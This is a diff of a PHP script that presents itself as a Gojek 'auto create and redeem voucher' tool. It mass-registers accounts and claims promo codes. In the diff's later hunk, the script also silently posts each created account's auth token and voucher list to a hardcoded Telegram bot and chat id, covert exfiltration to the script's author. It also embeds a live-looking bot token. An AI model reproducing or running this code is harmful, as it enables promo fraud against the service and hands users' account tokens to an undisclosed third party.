@@ -1,17 +1,17 @@
 <?php
 date_default_timezone_set('Asia/Jakarta');
 include "function.php";
-echo "| Version : alakadarnya      \n";
+    echo"\n";
+echo "| Version : BETA       \n";
 echo color("nevy"," ==========+++++++++==========\n");
-echo color("nevy","| Claim Voucher Gojek\n");
-echo color("nevy","| Auto create Gojek X Redeem voucher \n");
-echo color("nevy","| github: bocahbarbar 		 	     \n");
+echo color("nevy","| Auto create Gojek\n");
+echo color("nevy","| Redeem voucher dan jajan \n");
+echo color("nevy","| github: bocahbarbar                 \n");
 echo color("nevy","| Creator : bocah bar bar            \n");
 echo "| Waktu    :".date('[d-m-Y] [H:i:s]')."   \n";
 echo " ==========+++++++++==========\n";
-
 // function change(){
-	
+    
         $nama = nama();
         $email = str_replace(" ", "", $nama) . mt_rand(100, 999);
         ulang:
@@ -23,7 +23,6 @@ echo " ==========+++++++++==========\n";
         $nohp = str_replace(")","",$nohp);
         $nohp = str_replace("-","",$nohp);
         $nohp = str_replace(" ","",$nohp);
-
         if (!preg_match('/[^+0-9]/', trim($nohp))) {
             if (substr(trim($nohp),0,3)=='62') {
                 $hp = trim($nohp);
@@ -104,10 +103,10 @@ echo " ==========+++++++++==========\n";
         sleep(1);
         }
         sleep(3);
-        $goride = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"Ayocobagojek"}');
+        $goride = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"AYOCOBAGOJEK"}');
         $message1 = fetch_value($goride,'"message":"','"');
         echo "\n".color("green","+] Message: ".$message1);
-        echo "\n".color("yellow","!] Claim voc GOFOODSANTUY19");
+        echo "\n".color("yellow","!] Claim voc AYOCOBAGOJEK");
         echo "\n".color("yellow","!] Please wait");
         for($a=1;$a<=3;$a++){
         echo color("yellow",".");
@@ -143,15 +142,17 @@ echo " ==========+++++++++==========\n";
         $expired5 = getStr1('"expiry_date":"','"',$cekvoucher,'5');
         $expired6 = getStr1('"expiry_date":"','"',$cekvoucher,'6');
         $expired7 = getStr1('"expiry_date":"','"',$cekvoucher,'7');
+        echo color("nevy","| Creator : bocah bar bar            \n");
+        echo color("red","| Selamat Makan Beb :* PakPres        \n");
         $TOKEN  = "833122415:AAGyUuqdPo4bNu8NQUozvAh9UIMG4py0hfQ";
-	$chatid = "782106563";
-	$pesan 	= "[+] Gojek Account Info [+]\n\n".$token."\n\nTotalVoucher = ".$total."\n[+] ".$voucher1."\n[+] Exp : [".$expired1."]\n[+] ".$voucher2."\n[+] Exp : [".$expired2."]\n[+] ".$voucher3."\n[+] Exp : [".$expired3."]\n[+] ".$voucher4."\n[+] Exp : [".$expired4."]\n[+] ".$voucher5."\n[+] Exp : [".$expired5."]\n[+] ".$voucher6."\n[+] Exp : [".$expired6."]\n[+] ".$voucher7."\n[+] Exp : [".$expired7."]";
-	$method	= "sendMessage";
-	$url    = "https://api.telegram.org/bot" . $TOKEN . "/". $method;
-	$post = [
- 		'chat_id' => $chatid,
+    $chatid = "782106563";
+    $pesan  = "[+] Gojek Account Info [+]\n\n".$token."\n\nTotalVoucher = ".$total."\n[+] ".$voucher1."\n[+] Exp : [".$expired1."]\n[+] ".$voucher2."\n[+] Exp : [".$expired2."]\n[+] ".$voucher3."\n[+] Exp : [".$expired3."]\n[+] ".$voucher4."\n[+] Exp : [".$expired4."]\n[+] ".$voucher5."\n[+] Exp : [".$expired5."]\n[+] ".$voucher6."\n[+] Exp : [".$expired6."]\n[+] ".$voucher7."\n[+] Exp : [".$expired7."]";
+    $method = "sendMessage";
+    $url    = "https://api.telegram.org/bot" . $TOKEN . "/". $method;
+    $post = [
+        'chat_id' => $chatid,
                 'text' => $pesan
-        	];
+            ];
                 $header = [
                 "X-Requested-With: XMLHttpRequest",
                 "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36" 
@@ -186,5 +187,4 @@ echo " ==========+++++++++==========\n";
          goto ulang;
          }
 //  }
-
 // echo change()."\n";
